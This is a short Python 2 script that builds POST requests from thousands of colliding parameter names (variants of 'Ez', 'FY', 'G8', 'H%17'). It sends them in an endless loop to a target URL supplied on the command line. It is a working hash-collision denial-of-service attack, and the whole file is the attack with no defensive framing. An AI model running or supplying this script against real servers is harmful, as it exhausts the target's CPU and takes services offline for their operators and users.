#!/usr/bin/python

import itertools
import urllib
import sys
import time


def binlist(length):

# more equivalent strings
# Ez = G8 = FY
# H%17

#        '3' => 'H' . chr(23),
#        '4' => 'D'.chr(122+33), 

    #return ["".join(seq) for seq in itertools.product(('tt', 'uU', 'v6'), repeat=length)]
    #return ["".join(seq) for seq in itertools.product(('tt', 'uU'), repeat=length)]
    #return ["".join(seq) for seq in itertools.product(('Ez', 'FY', 'G8'), repeat=length)]
    return ["".join(seq) for seq in itertools.product(('Ez', 'FY', 'G8', 'H%17'), repeat=length)]
    #return ["".join(seq) for seq in itertools.product(('Ez', 'FY', 'G8', 'H%17', 'D%9b'), repeat=length)]

    

if __name__ == "__main__":

    postdata = ''
    test = {}
    i = 0
    for s in binlist(7):
        postdata += '%s=&' % s
        #test[s] = i
        i += 1
    #print postdata

    #postdata = 'a=a&' * 30000

    while True:

        print "%i total parameters" % i
        print "Sending payload of %i bytes" % len(postdata)
        f = urllib.urlopen(sys.argv[1], postdata)
        f.read()
        print "Received response"
        
        #time.sleep(0.5)
